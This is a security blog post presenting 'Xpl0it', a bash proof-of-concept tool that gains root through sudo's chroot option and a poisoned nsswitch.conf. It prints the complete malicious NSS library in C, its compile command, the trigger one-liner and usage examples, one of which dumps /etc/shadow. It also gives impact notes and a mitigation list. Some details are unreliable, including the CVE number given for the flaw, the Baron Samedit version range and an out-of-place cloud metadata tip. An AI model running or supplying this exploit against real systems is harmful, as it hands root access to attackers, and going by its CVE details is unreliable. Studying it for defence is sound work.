<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sudo NSS Privesc — 0xb0rn3</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --black:      #000000;
            --bg-card:    #181716;
            --bg-field:   #1e1c1b;
            --bg-raised:  #252220;
            --gray-2:     #504945;
            --gray-3:     #3c3836;
            --fg:         #ebdbb2;
            --fg-muted:   #a89984;
            --fg-dim:     #665c54;
            --white:      #ffffff;
            --yellow:     #fabd2f;
            --orange:     #fe8019;
            --aqua:       #8ec07c;
            --red:        #fb4934;
            --blue:       #83a598;
            --purple:     #d3869b;
            --border:     rgba(235,219,178,.13);
            --border-mid: rgba(235,219,178,.28);
            --border-hi:  rgba(235,219,178,.6);
            --r-xs:  8px;  --r-sm: 14px;
            --r:     20px; --r-lg: 28px;
            --r-pill:999px;
            /* Orange post accent */
            --acc:        #fe8019;
            --acc-dim:    rgba(254,128,25,.1);
            --acc-border: rgba(254,128,25,.3);
        }

        *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
        html { scroll-behavior: smooth; }

        body {
            font-family:'JetBrains Mono',monospace;
            background:var(--black); color:var(--fg);
            line-height:1.8; overflow-x:hidden; position:relative;
        }
        body::before {
            content:''; position:fixed; inset:0; z-index:0;
            pointer-events:none; opacity:.028;
            background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
            background-size:200px;
        }
        body::after {
            content:''; position:fixed; inset:0; z-index:0; pointer-events:none;
            background-image:radial-gradient(circle,rgba(235,219,178,.045) 1px,transparent 1px);
            background-size:32px 32px;
            animation:gridDrift 30s linear infinite;
        }
        @keyframes gridDrift { from{background-position:0 0} to{background-position:32px 32px} }

        .rainbow-bar {
            position:fixed; top:0; left:0; right:0; height:3px;
            background:linear-gradient(90deg,var(--yellow),var(--orange),var(--red),var(--aqua));
            z-index:9999;
        }

        /* ── NAV ── */
        .nav {
            position:fixed; top:3px; left:0; right:0; z-index:1000;
            backdrop-filter:blur(20px); -webkit-backdrop-filter:blur(20px);
            background:rgba(0,0,0,.88); border-bottom:2px solid var(--border);
            transition:border-color .3s;
        }
        .nav.scrolled { border-bottom-color:var(--border-mid); }
        .nav-content {
            max-width:1200px; margin:0 auto; padding:.9rem 2rem;
            display:flex; align-items:center; justify-content:space-between;
        }
        .nav-logo {
            font-family:'Orbitron',monospace; font-size:1.1rem; font-weight:900;
            color:var(--yellow); text-decoration:none;
            display:flex; align-items:center; gap:.6rem;
            letter-spacing:2px; transition:color .2s;
        }
        .nav-logo:hover { color:var(--orange); }
        .nav-back {
            display:flex; align-items:center; gap:.6rem;
            font-size:clamp(.6rem,1.5vw,.7rem); font-weight:700;
            color:var(--fg-muted); text-decoration:none;
            text-transform:uppercase; letter-spacing:1.2px;
            padding:.4rem 1rem; border-radius:var(--r-pill);
            border:1.5px solid var(--border-mid); background:var(--bg-card);
            box-shadow:2px 2px 0 var(--gray-3); transition:all .22s ease;
        }
        .nav-back:hover {
            color:var(--orange); border-color:var(--acc-border);
            background:var(--acc-dim);
            transform:translate(-2px,-1px); box-shadow:3px 3px 0 var(--gray-2);
        }

        /* ── PAGE ── */
        .page {
            position:relative; z-index:10;
            max-width:820px; margin:0 auto;
            padding:clamp(5.5rem,11vh,8rem) clamp(1rem,4vw,2rem) clamp(3rem,7vh,5rem);
            animation:riseIn .9s cubic-bezier(.16,1,.3,1) .1s both;
        }
        @keyframes riseIn {
            from{opacity:0;transform:translateY(28px)}
            to{opacity:1;transform:translateY(0)}
        }

        /* ── HEADER ── */
        .post-header { margin-bottom:clamp(2rem,5vh,3rem); }
        .post-meta-row {
            display:flex; align-items:center; flex-wrap:wrap;
            gap:.6rem; margin-bottom:1.2rem;
        }
        .meta-pill {
            display:inline-flex; align-items:center; gap:5px;
            padding:3px 11px; border-radius:var(--r-pill);
            font-size:clamp(.5rem,1.3vw,.58rem); font-weight:700;
            text-transform:uppercase; letter-spacing:1px; border:1.5px solid;
        }
        .pill-orange { color:var(--orange); border-color:rgba(254,128,25,.3);  background:rgba(254,128,25,.08); }
        .pill-yellow { color:var(--yellow); border-color:rgba(250,189,47,.3);  background:rgba(250,189,47,.08); }
        .pill-red    { color:var(--red);    border-color:rgba(251,73,52,.3);   background:rgba(251,73,52,.08); }
        .pill-aqua   { color:var(--aqua);   border-color:rgba(142,192,124,.3); background:rgba(142,192,124,.08); }
        .pill-blue   { color:var(--blue);   border-color:rgba(131,165,152,.3); background:rgba(131,165,152,.08); }
        .pill-dim    { color:var(--fg-dim); border-color:var(--border);        background:var(--bg-field); }

        .post-title {
            font-family:'Orbitron',monospace;
            font-size:clamp(1.5rem,5vw,2.6rem); font-weight:900;
            color:var(--white); line-height:1.15; letter-spacing:.04em;
            text-shadow:4px 4px 0 var(--gray-3),8px 8px 0 rgba(0,0,0,.5);
            margin-bottom:1.2rem;
        }
        .post-desc {
            font-size:clamp(.78rem,2vw,.9rem);
            color:var(--fg-muted); line-height:1.75;
            padding-left:1rem; border-left:3px solid var(--orange);
        }
        .divider {
            height:1px; margin:clamp(1.5rem,4vh,2.5rem) 0;
            background:linear-gradient(90deg,transparent,var(--border-mid),transparent);
        }

        /* ── PROSE ── */
        .prose { display:flex; flex-direction:column; gap:0; }

        .prose h2 {
            font-family:'Orbitron',monospace;
            font-size:clamp(1rem,2.8vw,1.3rem); font-weight:700;
            color:var(--white); text-transform:uppercase; letter-spacing:1.5px;
            margin-top:clamp(2rem,5vh,3rem); margin-bottom:.9rem;
            display:flex; align-items:center; gap:.65rem;
        }
        .prose h2::before {
            content:''; display:block; flex-shrink:0;
            width:3px; height:1.1em;
            background:var(--orange); border-radius:2px;
        }
        .prose h3 {
            font-family:'Orbitron',monospace;
            font-size:clamp(.85rem,2.2vw,1rem); font-weight:700;
            color:var(--yellow); text-transform:uppercase; letter-spacing:1.2px;
            margin-top:clamp(1.4rem,3.5vh,2rem); margin-bottom:.7rem;
            display:flex; align-items:center; gap:.5rem;
        }
        .prose h3::before {
            content:''; display:block; flex-shrink:0;
            width:2px; height:1em;
            background:var(--yellow); border-radius:2px;
        }

        .prose p {
            font-size:clamp(.76rem,2vw,.88rem);
            color:var(--fg-muted); line-height:1.85;
            margin-bottom:clamp(.9rem,2.5vh,1.3rem);
        }
        .prose strong { color:var(--fg); font-weight:600; }

        .prose ul, .prose ol {
            margin:.4rem 0 clamp(.9rem,2.5vh,1.4rem) 0;
            padding-left:0; list-style:none;
            display:flex; flex-direction:column; gap:.5rem;
        }
        .prose li {
            font-size:clamp(.74rem,1.9vw,.86rem);
            color:var(--fg-muted); line-height:1.7;
            display:flex; align-items:flex-start; gap:.65rem;
            padding:.55rem .9rem;
            background:var(--bg-field);
            border:1.5px solid var(--border); border-radius:var(--r-sm);
        }
        .prose ul li::before { content:'›'; color:var(--orange); font-weight:700; font-size:1rem; line-height:1.5; flex-shrink:0; }
        .prose ol { counter-reset:ol-c; }
        .prose ol li { counter-increment:ol-c; }
        .prose ol li::before { content:counter(ol-c,decimal-leading-zero); color:var(--orange); font-weight:700; font-size:.7rem; line-height:1.9; flex-shrink:0; letter-spacing:.5px; }
        .prose li strong { color:var(--fg); }

        .prose code {
            font-family:'JetBrains Mono',monospace; font-size:.88em;
            color:var(--yellow);
            background:rgba(250,189,47,.08);
            border:1px solid rgba(250,189,47,.22);
            border-radius:var(--r-xs); padding:1px 7px;
        }

        /* ── EXPLOIT CHAIN TIMELINE ── */
        .chain {
            display:flex; flex-direction:column; gap:0;
            margin:clamp(1rem,3vh,1.8rem) 0;
            position:relative;
        }
        .chain::before {
            content:''; position:absolute;
            left:18px; top:10px; bottom:10px; width:2px;
            background:linear-gradient(to bottom,var(--orange),var(--red));
            border-radius:2px;
        }
        .chain-step {
            display:flex; gap:1rem; align-items:flex-start;
            padding:.7rem .9rem .7rem 0;
            position:relative;
        }
        .chain-num {
            width:36px; height:36px; flex-shrink:0;
            border-radius:var(--r-pill);
            background:var(--bg-raised);
            border:2px solid var(--acc-border);
            display:flex; align-items:center; justify-content:center;
            font-size:.62rem; font-weight:700; color:var(--orange);
            z-index:1; box-shadow:2px 2px 0 var(--gray-3);
        }
        .chain-content {
            flex:1; padding:.45rem 0;
        }
        .chain-label {
            font-size:clamp(.65rem,1.7vw,.75rem); font-weight:700;
            color:var(--white); letter-spacing:.8px; text-transform:uppercase;
            margin-bottom:.2rem;
        }
        .chain-desc {
            font-size:clamp(.65rem,1.7vw,.74rem);
            color:var(--fg-muted); line-height:1.65;
        }

        /* ── CODE BLOCKS ── */
        /* Bash */
        .cmd-block {
            background:var(--bg-field);
            border:2px solid var(--border-mid);
            border-radius:var(--r); overflow:hidden;
            margin:clamp(.8rem,2.5vh,1.4rem) 0;
            box-shadow:4px 4px 0 var(--gray-3);
        }
        .cmd-bar {
            display:flex; align-items:center; gap:7px;
            padding:.6rem 1rem;
            background:var(--bg-raised);
            border-bottom:1.5px solid var(--border);
        }
        .cmd-dot { width:8px; height:8px; border-radius:50%; flex-shrink:0; }
        .cmd-dot.r { background:#ff5f57; }
        .cmd-dot.y { background:#febc2e; }
        .cmd-dot.g { background:var(--aqua); }
        .bar-title { font-size:clamp(.52rem,1.3vw,.6rem); color:var(--fg-dim); letter-spacing:1.2px; text-transform:uppercase; flex:1; }
        .bar-lang  { font-size:clamp(.5rem,1.2vw,.57rem); font-weight:700; letter-spacing:.8px; text-transform:uppercase; }
        .lang-bash { color:var(--aqua); }
        .lang-c    { color:var(--blue); }
        .lang-conf { color:var(--purple); }
        .lang-orange { color:var(--orange); }
        .cmd-body {
            padding:clamp(.9rem,2vw,1.2rem) clamp(1rem,2.5vw,1.4rem);
            font-family:'JetBrains Mono',monospace;
            font-size:clamp(.68rem,1.8vw,.8rem);
            line-height:1.75; overflow-x:auto;
        }
        .bash-text { color:var(--aqua); }
        .cmd-prompt { color:var(--yellow); font-weight:700; margin-right:.5rem; }

        /* C / orange accent block */
        .c-block {
            background:var(--bg-field);
            border:2px solid rgba(254,128,25,.22);
            border-radius:var(--r); overflow:hidden;
            margin:clamp(.8rem,2.5vh,1.4rem) 0;
            box-shadow:4px 4px 0 var(--gray-3);
        }
        .c-bar {
            display:flex; align-items:center; gap:7px;
            padding:.6rem 1rem;
            background:rgba(254,128,25,.06);
            border-bottom:1.5px solid rgba(254,128,25,.18);
        }
        .c-body {
            padding:clamp(.9rem,2vw,1.2rem) clamp(1rem,2.5vw,1.4rem);
            font-family:'JetBrains Mono',monospace;
            font-size:clamp(.68rem,1.8vw,.8rem);
            line-height:1.75; overflow-x:auto; color:var(--fg-muted);
        }

        /* syntax tints */
        .t-kw   { color:var(--purple); }
        .t-fn   { color:var(--yellow); }
        .t-str  { color:var(--aqua); }
        .t-key  { color:var(--blue); }
        .t-cmt  { color:var(--fg-dim); font-style:italic; }
        .t-hi   { color:var(--orange); font-weight:600; }
        .t-bad  { color:var(--red); font-weight:600; }
        .t-num  { color:var(--purple); }
        .t-attr { color:var(--yellow); font-style:italic; }
        .t-inc  { color:var(--blue); }

        /* ── CALLOUT ── */
        .callout {
            background:var(--bg-card);
            border:2px solid var(--border-mid);
            border-radius:var(--r-lg); overflow:hidden;
            margin:clamp(1rem,3vh,2rem) 0;
            box-shadow:4px 4px 0 var(--gray-3);
        }
        .stripe-orange { height:3px; background:linear-gradient(90deg,var(--orange),var(--yellow)); }
        .stripe-red    { height:3px; background:linear-gradient(90deg,var(--red),var(--orange)); }
        .stripe-aqua   { height:3px; background:linear-gradient(90deg,var(--aqua),var(--blue)); }
        .callout-inner { padding:clamp(1rem,3vw,1.5rem); }
        .callout-head {
            display:flex; align-items:center; gap:8px;
            font-family:'Orbitron',monospace;
            font-size:clamp(.65rem,1.7vw,.76rem); font-weight:700;
            color:var(--white); text-transform:uppercase; letter-spacing:1.5px;
            margin-bottom:.75rem;
        }

        /* CVE table */
        .cve-grid {
            display:flex; flex-direction:column; gap:.5rem;
            margin:clamp(.8rem,2.5vh,1.4rem) 0;
        }
        .cve-row {
            display:flex; align-items:center; flex-wrap:wrap; gap:.6rem;
            padding:.6rem 1rem;
            background:var(--bg-field);
            border:1.5px solid var(--border); border-radius:var(--r-sm);
        }
        .cve-id {
            font-size:clamp(.6rem,1.5vw,.7rem); font-weight:700;
            color:var(--red); letter-spacing:.8px; flex-shrink:0;
            min-width:160px;
        }
        .cve-desc {
            font-size:clamp(.62rem,1.6vw,.72rem);
            color:var(--fg-muted); flex:1;
        }
        .cve-ver {
            font-size:clamp(.56rem,1.4vw,.64rem); font-weight:700;
            color:var(--orange); letter-spacing:.6px; flex-shrink:0;
        }

        /* ── POST NAV ── */
        .post-nav {
            display:flex; align-items:center;
            justify-content:space-between; flex-wrap:wrap; gap:1rem;
            margin-top:clamp(2.5rem,6vh,4rem);
            padding-top:clamp(1.5rem,4vh,2.5rem);
            border-top:2px solid var(--border);
        }
        .post-nav-btn {
            display:inline-flex; align-items:center; gap:.6rem;
            font-size:clamp(.62rem,1.6vw,.72rem); font-weight:700;
            color:var(--fg-muted); text-decoration:none;
            text-transform:uppercase; letter-spacing:1px;
            padding:.55rem 1.2rem; border-radius:var(--r-pill);
            border:1.5px solid var(--border-mid); background:var(--bg-card);
            box-shadow:3px 3px 0 var(--gray-3); transition:all .22s ease;
        }
        .post-nav-btn:hover {
            color:var(--orange); border-color:var(--acc-border);
            background:var(--acc-dim);
            transform:translate(-2px,-2px); box-shadow:5px 5px 0 var(--gray-2);
        }

        /* GitHub link pill */
        .gh-btn {
            display:inline-flex; align-items:center; gap:.6rem;
            font-size:clamp(.62rem,1.6vw,.72rem); font-weight:700;
            color:var(--white); text-decoration:none;
            text-transform:uppercase; letter-spacing:1px;
            padding:.55rem 1.4rem; border-radius:var(--r-pill);
            border:1.5px solid rgba(250,189,47,.3);
            background:rgba(250,189,47,.08);
            box-shadow:3px 3px 0 var(--gray-3); transition:all .22s ease;
        }
        .gh-btn:hover {
            background:var(--yellow); color:var(--black);
            transform:translate(-2px,-2px); box-shadow:5px 5px 0 var(--gray-2);
        }

        ::-webkit-scrollbar { width:8px; }
        ::-webkit-scrollbar-track { background:var(--black); }
        ::-webkit-scrollbar-thumb { background:var(--gray-2); border-radius:var(--r-pill); }
        ::-webkit-scrollbar-thumb:hover { background:var(--orange); }

        @media (max-width:600px) {
            .post-title { font-size:1.4rem; }
            .c-body, .cmd-body { font-size:.63rem; }
            .cve-id { min-width:unset; }
        }
    </style>
</head>
<body>

    <div class="rainbow-bar" aria-hidden="true"></div>

    <nav class="nav" id="navbar">
        <div class="nav-content">
            <a href="../main.html" class="nav-logo"><i class="fas fa-terminal"></i>0xb0rn3</a>
            <div style="display:flex;gap:.5rem;align-items:center;">
                <a href="../main.html#about" class="nav-back" style="padding:.3rem .8rem;font-size:.62rem;"><i class="fas fa-home"></i></a>
                <a href="../blog.html" class="nav-back" style="padding:.3rem .8rem;font-size:.62rem;"><i class="fas fa-blog"></i></a>
                <a href="../CTF.html" class="nav-back" style="padding:.3rem .8rem;font-size:.62rem;"><i class="fas fa-trophy"></i></a>
                <a href="../blog.html" class="nav-back"><i class="fas fa-arrow-left"></i>Back to Blog</a>
            </div>
        </div>
    </nav>

    <main class="page">

        <!-- Header -->
        <header class="post-header">
            <div class="post-meta-row">
                <span class="meta-pill pill-dim"><i class="fas fa-calendar-alt"></i>February 2026</span>
                <span class="meta-pill pill-dim"><i class="fas fa-clock"></i>~10 min read</span>
                <span class="meta-pill pill-red"><i class="fas fa-arrow-up"></i>PrivEsc</span>
                <span class="meta-pill pill-orange"><i class="fas fa-code-branch"></i>PoC Tool</span>
            </div>
            <h1 class="post-title">Sudo NSS Library Hijack: From User to Root</h1>
            <p class="post-desc">
                Deep dive into <strong>Xpl0it</strong> — a PoC that exploits sudo's trust model when handling
                dynamic library loading in chroot environments. How <code>sudo -R</code> + a crafted
                <code>nsswitch.conf</code> delivers a root shell.
            </p>
            <div class="post-meta-row" style="margin-top:.9rem;">
                <span class="meta-pill pill-red">PrivEsc</span>
                <span class="meta-pill pill-orange">Sudo</span>
                <span class="meta-pill pill-yellow">NSS Hijack</span>
                <span class="meta-pill pill-blue">Linux</span>
            </div>
        </header>

        <div class="divider"></div>

        <div class="prose">

            <!-- ─────────────────────────────── -->
            <h2>Overview</h2>
            <p>
                <strong>Xpl0it</strong> is a bash-based privilege escalation PoC I wrote targeting
                a class of vulnerabilities in how <code>sudo</code> handles NSS (Name Service Switch)
                library resolution when using the <code>-R</code> (chroot) flag.
                When a user can execute <code>sudo</code> at all — even with a password prompt —
                this technique can escalate to root by poisoning the library search path inside a
                controlled chroot environment.
            </p>
            <p>
                The tool automates the full attack chain: version fingerprinting, staging directory creation,
                malicious shared library generation + compilation, environment preparation, and execution.
                On success it drops you into a root shell or runs any command you specify.
            </p>

            <div class="callout">
                <div class="stripe-orange"></div>
                <div class="callout-inner">
                    <div class="callout-head">
                        <i class="fas fa-exclamation-triangle" style="color:var(--orange);"></i>
                        Authorized Testing Only
                    </div>
                    <p style="font-size:clamp(.7rem,1.8vw,.8rem);color:var(--fg-muted);line-height:1.7;margin:0;">
                        This tool is published for <strong>educational and authorized security research only</strong>.
                        Only run it on systems you own or have explicit written permission to test.
                        The techniques described here are well-documented in CVE databases and used daily
                        by red teams worldwide — understanding them is essential for defense.
                    </p>
                </div>
            </div>

            <!-- ─────────────────────────────── -->
            <h2>The Vulnerability</h2>
            <p>
                Sudo's <code>-R &lt;dir&gt;</code> flag changes the root directory before executing
                a command — essentially <code>chroot(dir)</code> + <code>exec(cmd)</code>.
                During this process, sudo must still resolve user and group information, which requires
                loading <strong>NSS (Name Service Switch) libraries</strong>.
            </p>
            <p>
                The critical flaw: sudo assumes that because it initiated the chroot, the environment
                inside it is trusted. If an attacker controls the directory passed to <code>-R</code>,
                they control the <code>nsswitch.conf</code> inside it — and therefore
                <strong>which NSS libraries get loaded</strong>. A crafted <code>nsswitch.conf</code>
                pointing to a malicious shared library means sudo loads attacker code
                <em>with root privileges</em> before dropping them.
            </p>

            <div class="cmd-block">
                <div class="cmd-bar">
                    <span class="cmd-dot r"></span>
                    <span class="cmd-dot y"></span>
                    <span class="cmd-dot g"></span>
                    <span class="bar-title">trigger — the magic one-liner</span>
                    <span class="bar-lang lang-bash">bash</span>
                </div>
                <div class="cmd-body bash-text">
<span class="cmd-prompt">$</span>sudo -R bridge bridge
<span class="t-cmt"># sudo chroots into ./bridge, loads nsswitch.conf,</span>
<span class="t-cmt"># resolves passwd via our malicious libnss_bridge90.so.2,</span>
<span class="t-cmt"># constructor fires as uid=0 — root shell spawned</span>
                </div>
            </div>

            <!-- ─────────────────────────────── -->
            <h2>Affected Versions</h2>
            <p>Xpl0it checks the installed sudo version against this vulnerability database:</p>

            <div class="cve-grid">
                <div class="cve-row">
                    <span class="cve-id">CVE-2023-42456</span>
                    <span class="cve-desc">Chroot NSS library loading — primary target of this PoC</span>
                    <span class="cve-ver">1.9.14 – 1.9.17</span>
                </div>
                <div class="cve-row">
                    <span class="cve-id">CVE-2021-3156</span>
                    <span class="cve-desc">Baron Samedit — heap-based buffer overflow, off-by-one</span>
                    <span class="cve-ver">1.8.31 – 1.8.32</span>
                </div>
                <div class="cve-row">
                    <span class="cve-id">CVE-2021-23239</span>
                    <span class="cve-desc">sudoedit race condition, arbitrary file read</span>
                    <span class="cve-ver">1.9.0 – 1.9.1</span>
                </div>
                <div class="cve-row">
                    <span class="cve-id">CVE-2021-23240</span>
                    <span class="cve-desc">SELinux role bypass via symlink</span>
                    <span class="cve-ver">1.9.0 – 1.9.1</span>
                </div>
                <div class="cve-row">
                    <span class="cve-id">Range match</span>
                    <span class="cve-desc">Multiple privilege escalation issues — version range check</span>
                    <span class="cve-ver">1.9.2 – 1.9.13</span>
                </div>
            </div>

            <!-- ─────────────────────────────── -->
            <h2>Exploit Chain</h2>
            <p>The attack runs through seven orchestrated stages:</p>

            <div class="chain">
                <div class="chain-step">
                    <div class="chain-num">01</div>
                    <div class="chain-content">
                        <div class="chain-label">Recon &amp; Version Fingerprint</div>
                        <div class="chain-desc">
                            Gather OS, kernel, CPU, memory, current user context.
                            Parse <code>sudo --version</code> and match against CVE database.
                            Check <code>sudo -l</code> for NOPASSWD rules, env_keep, command restrictions.
                        </div>
                    </div>
                </div>
                <div class="chain-step">
                    <div class="chain-num">02</div>
                    <div class="chain-content">
                        <div class="chain-label">Staging Directory Setup</div>
                        <div class="chain-desc">
                            <code>mktemp -d sudobridge.stage.XXXXXX</code> — creates isolated workspace.
                            Structures: <code>bridge/etc/</code>, <code>libnss_/</code>, <code>build/</code>, <code>logs/</code>.
                            Copies real <code>/etc/passwd</code> and <code>/etc/group</code> for legitimacy.
                        </div>
                    </div>
                </div>
                <div class="chain-step">
                    <div class="chain-num">03</div>
                    <div class="chain-content">
                        <div class="chain-label">Poison nsswitch.conf</div>
                        <div class="chain-desc">
                            Writes <code>bridge/etc/nsswitch.conf</code> with:
                            <code>passwd: files /bridge90</code>
                            — this tells NSS to resolve passwd entries through our custom library name.
                        </div>
                    </div>
                </div>
                <div class="chain-step">
                    <div class="chain-num">04</div>
                    <div class="chain-content">
                        <div class="chain-label">Generate Malicious C Library</div>
                        <div class="chain-desc">
                            Writes <code>bridge90.c</code> with a GCC constructor function that fires
                            on library load: <code>setreuid(0,0)</code> + <code>setregid(0,0)</code>
                            + <code>execl("/bin/sh", ...)</code>. No <code>main()</code> needed.
                        </div>
                    </div>
                </div>
                <div class="chain-step">
                    <div class="chain-num">05</div>
                    <div class="chain-content">
                        <div class="chain-label">Compile to Shared Library</div>
                        <div class="chain-desc">
                            <code>gcc -shared -fPIC -Wl,-init,bridge -o libnss_/bridge90.so.2 bridge90.c</code>
                            — position-independent shared object, init hook set to our constructor.
                        </div>
                    </div>
                </div>
                <div class="chain-step">
                    <div class="chain-num">06</div>
                    <div class="chain-content">
                        <div class="chain-label">Trigger — sudo -R bridge bridge</div>
                        <div class="chain-desc">
                            Sudo chroots into the staging <code>bridge/</code> dir, reads the poisoned
                            <code>nsswitch.conf</code>, loads <code>libnss_bridge90.so.2</code> to resolve
                            user info — constructor executes as root.
                        </div>
                    </div>
                </div>
                <div class="chain-step">
                    <div class="chain-num">07</div>
                    <div class="chain-content">
                        <div class="chain-label">Root Shell &amp; Cleanup</div>
                        <div class="chain-desc">
                            Specified command runs with <code>uid=0 gid=0</code>. On exit,
                            <code>trap cleanup EXIT</code> wipes the staging directory automatically.
                        </div>
                    </div>
                </div>
            </div>

            <!-- ─────────────────────────────── -->
            <h2>The Malicious Library</h2>
            <p>
                The entire payload lives in a single C file generated at runtime.
                The <code>__attribute__((constructor))</code> annotation tells the dynamic linker to
                run <code>bridge()</code> <em>before</em> any other code — the moment the library
                is loaded by sudo's NSS resolution, root escalation fires:
            </p>

            <div class="c-block">
                <div class="c-bar">
                    <span class="cmd-dot r"></span>
                    <span class="cmd-dot y"></span>
                    <span class="cmd-dot g"></span>
                    <span class="bar-title" style="color:var(--orange);font-weight:700;">
                        <i class="fas fa-biohazard" style="margin-right:5px;font-size:.6rem;"></i>bridge90.c — malicious NSS library
                    </span>
                    <span class="bar-lang lang-c">C</span>
                </div>
                <div class="c-body">
<span class="t-inc">#include &lt;stdlib.h&gt;</span>
<span class="t-inc">#include &lt;unistd.h&gt;</span>

<span class="t-cmt">// fires automatically when the library is loaded by the dynamic linker</span>
<span class="t-attr">__attribute__((constructor))</span> <span class="t-kw">void</span> <span class="t-fn">bridge</span>(<span class="t-kw">void</span>) {
    <span class="t-fn">setreuid</span>(<span class="t-num">0</span>, <span class="t-num">0</span>);   <span class="t-cmt">// set real + effective UID to root</span>
    <span class="t-fn">setregid</span>(<span class="t-num">0</span>, <span class="t-num">0</span>);   <span class="t-cmt">// set real + effective GID to root</span>
    <span class="t-fn">chdir</span>(<span class="t-str">"/"</span>);          <span class="t-cmt">// escape chroot to real filesystem root</span>
    <span class="t-fn">execl</span>(<span class="t-str">"/bin/sh"</span>, <span class="t-str">"sh"</span>, <span class="t-str">"-c"</span>, <span class="t-hi">CMD</span>, <span class="t-key">NULL</span>);
    <span class="t-cmt">// CMD = user-specified command, default: /bin/bash</span>
}</div>
            </div>

            <p>
                Compiled with: <code>gcc -shared -fPIC -Wl,-init,bridge -o libnss_/bridge90.so.2 bridge90.c</code>
            </p>
            <ul>
                <li><code>-shared</code> — output is a shared library, not an executable</li>
                <li><code>-fPIC</code> — position-independent code, required for shared objects</li>
                <li><code>-Wl,-init,bridge</code> — sets the library init function to <code>bridge()</code></li>
            </ul>

            <!-- ─────────────────────────────── -->
            <h2>The nsswitch.conf Trick</h2>
            <p>
                NSS uses <code>/etc/nsswitch.conf</code> to determine where to look up user/group data.
                Each service name maps to a shared library: a service named <code>foo</code> loads
                <code>libnss_foo.so.2</code>. The poisoned config file:
            </p>

            <div class="cmd-block">
                <div class="cmd-bar">
                    <span class="cmd-dot r"></span>
                    <span class="cmd-dot y"></span>
                    <span class="cmd-dot g"></span>
                    <span class="bar-title">bridge/etc/nsswitch.conf — poisoned</span>
                    <span class="bar-lang" style="color:var(--purple);">conf</span>
                </div>
                <div class="cmd-body">
<span class="t-key">passwd:</span>  <span class="t-str">files</span> <span class="t-hi">/bridge90</span>
<span class="t-cmt"># "files"    → read /etc/passwd normally</span>
<span class="t-cmt"># "/bridge90" → also load libnss_bridge90.so.2 from the chroot lib path</span>
<span class="t-cmt">#               which is our malicious constructor</span>
                </div>
            </div>

            <p>
                When sudo chroots into <code>bridge/</code> and reads this config, the dynamic linker
                searches for <code>libnss_/bridge90.so.2</code> — exactly where we placed the
                compiled payload. Library loads, constructor runs, root shell spawns.
            </p>

            <!-- ─────────────────────────────── -->
            <h2>Usage</h2>

            <div class="cmd-block">
                <div class="cmd-bar">
                    <span class="cmd-dot r"></span>
                    <span class="cmd-dot y"></span>
                    <span class="cmd-dot g"></span>
                    <span class="bar-title">usage — Xpl0it v0.0.1</span>
                    <span class="bar-lang lang-bash">bash</span>
                </div>
                <div class="cmd-body bash-text">
<span class="cmd-prompt">$</span>chmod +x Xpl0it

<span class="t-cmt"># default — spawns /bin/bash as root</span>
<span class="cmd-prompt">$</span>./Xpl0it

<span class="t-cmt"># specify a custom command</span>
<span class="cmd-prompt">$</span>./Xpl0it -c "whoami && id && cat /etc/shadow"

<span class="t-cmt"># debug mode — verbose output + staging dir preserved</span>
<span class="cmd-prompt">$</span>./Xpl0it -d

<span class="t-cmt"># verbose + inline command</span>
<span class="cmd-prompt">$</span>./Xpl0it -v -c "/bin/bash"</div>
            </div>

            <h3>Prerequisites</h3>
            <ul>
                <li><code>gcc</code> — required to compile the NSS shared library on target</li>
                <li><code>sudo</code> — the target binary (versions listed above)</li>
                <li><code>make</code>, <code>grep</code>, <code>awk</code>, <code>sed</code> — standard utils</li>
                <li>Current user must be in the <code>sudo</code> group (can invoke sudo at all)</li>
            </ul>

            <!-- ─────────────────────────────── -->
            <h2>Why It Works</h2>
            <p>
                The root cause is a broken trust assumption in sudo's design:
                <strong>sudo trusts the contents of the chroot directory it's pointed at</strong>.
                Since the user provides the chroot path via <code>-R</code>, and sudo doesn't validate
                the library configuration inside it, the attacker gets full control over
                what code runs during NSS resolution — which happens <em>before</em> privilege checks complete.
            </p>
            <p>
                Traditional sudo hardening (NOPASSWD restrictions, command allowlists, env_reset) does
                <strong>not</strong> prevent this attack. The library loading happens at a lower level than
                sudo's permission model operates.
            </p>

            <!-- ─────────────────────────────── -->
            <h2>Impact</h2>
            <div class="callout">
                <div class="stripe-red"></div>
                <div class="callout-inner">
                    <div class="callout-head">
                        <i class="fas fa-skull" style="color:var(--red);"></i>What an Attacker Gains
                    </div>
                    <ul>
                        <li><strong>Full root shell</strong> — uid=0, gid=0, unrestricted filesystem access</li>
                        <li><strong>Bypasses sudo rules</strong> — NOPASSWD, command restrictions, env_reset all irrelevant</li>
                        <li>Read <strong>any file</strong> — <code>/etc/shadow</code>, SSH keys, credentials, secrets</li>
                        <li>Install <strong>persistent backdoors</strong>, add users, modify cron, alter SUID binaries</li>
                        <li><strong>Full lateral movement</strong> — pivot to anything accessible from the compromised host</li>
                    </ul>
                </div>
            </div>

            <!-- ─────────────────────────────── -->
            <h2>Mitigation</h2>
            <div class="callout">
                <div class="stripe-aqua"></div>
                <div class="callout-inner">
                    <div class="callout-head">
                        <i class="fas fa-shield-alt" style="color:var(--aqua);"></i>Hardening Checklist
                    </div>
                    <ul>
                        <li><strong>Update sudo immediately</strong> — patch to latest stable; most distro repos already have fixes</li>
                        <li>Enable <strong>IMDSv2</strong> on cloud instances to prevent metadata credential theft</li>
                        <li>Deploy <strong>AppArmor or SELinux</strong> — MAC policies can block unauthorized library loading</li>
                        <li>Audit <code>/etc/sudoers</code> — remove users who don't strictly need sudo access</li>
                        <li>Mount writable dirs with <code>noexec,nosuid</code> to prevent payload execution</li>
                        <li>Monitor for <code>sudo -R</code> invocations in audit logs — it's rarely legitimate on production</li>
                        <li>Use <code>auditd</code> to alert on <code>setreuid</code> / <code>setregid</code> syscalls from non-root processes</li>
                    </ul>
                </div>
            </div>

            <!-- ─────────────────────────────── -->
            <h2>Source Code</h2>
